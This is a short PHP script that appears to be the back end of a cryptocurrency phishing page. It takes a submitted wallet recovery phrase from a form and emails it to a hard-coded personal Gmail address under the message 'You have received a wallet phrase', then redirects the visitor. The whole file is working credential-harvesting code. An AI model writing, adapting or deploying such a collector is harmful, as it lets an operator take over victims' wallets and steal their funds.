<?php

if (isset($_POST['submit'])) {
$subject = $_POST['phrase'];

$mailto = "dgonyedikachi@gmail.com";
$headers = "From: my website";
$txt = "You have received a wallet phrase";

 mail($mailto,$subject,$txt,$headers);
 header("location: index.php?mailsend");
}